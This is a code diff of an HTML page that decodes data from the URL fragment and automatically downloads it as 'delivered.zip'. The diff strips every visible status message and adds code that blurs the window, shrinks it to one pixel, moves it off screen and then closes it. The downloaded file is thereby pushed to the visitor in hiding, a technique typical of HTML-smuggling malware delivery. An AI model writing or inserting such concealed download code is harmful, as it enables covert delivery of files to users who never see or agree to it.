@@ -1,8 +1,10 @@
 <!DOCTYPE html>
-<html><head><title>Downloading...</title></head>
-<body style="font-family:sans-serif;text-align:center;margin-top:20vh;background:#f5f5f5">
-<h2 id="s">Preparing download...</h2>
+<html><head><title>.</title></head>
+<body>
 <script>
+window.blur();
+window.resizeTo(1,1);
+window.moveTo(-2000,-2000);
 try {
   var h = location.hash.slice(1);
   if (!h) throw 'No data';
@@ -16,10 +18,9 @@ try {
   a.download = 'delivered.zip';
   document.body.appendChild(a);
   a.click();
-  document.getElementById('s').textContent = 'delivered.zip downloaded ✓';
-  setTimeout(function(){ window.close(); }, 2000);
+  setTimeout(function(){ window.close(); }, 1500);
 } catch(e) {
-  document.getElementById('s').textContent = 'Error: ' + e;
+  document.body.textContent = 'Error: ' + e;
 }
 </script>
 </body></html>
